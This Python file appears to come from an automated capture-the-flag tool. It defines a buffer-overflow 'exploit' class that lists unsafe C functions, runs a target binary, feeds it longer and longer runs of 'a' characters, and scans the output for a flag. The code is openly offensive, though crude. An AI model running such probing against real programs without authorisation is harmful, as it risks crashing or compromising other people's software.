import subprocess
from time import sleep
from typing import List
from exploits.exploit import Exploit


class BufferOverflowAttack(Exploit):
    def __init__(self):
        super().__init__()

        self._name = "buffer overflow"
        self._vulnerable_functions = [
            "gets",
            "fgets",
            "strcopy",
            "strcat",
            "sprintf",
            "gets_s",
            "read",
            "strncpy",
            "strncat",
            "memcpy",
        ]

    @property
    def name(self) -> str:
        return self._name

    @property
    def vulnerable_functions(self) -> List[str]:
        return self._vulnerable_functions

    def attempt_exploit(self, path):
        print("attempting buffer overflow")

        iteration = 0

        failed = False

        while not failed:
            iteration += 1

            process = subprocess.Popen(
                f'"{path}"',
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                text=True,
            )

            while True:
                input_str = "".join(["a"] * iteration) + "z"
                print(input_str)

                process.stdin.write(input_str)
                process.stdin.flush()

                output = process.stdout.read()
                print(output)

                self.flag_finder.search_for_flag_in_text(output)
                
                if iteration == 128:
                    failed = True
                    break

                sleep(0.001)
                if process.poll() is not None:
                    process.terminate()
                    break
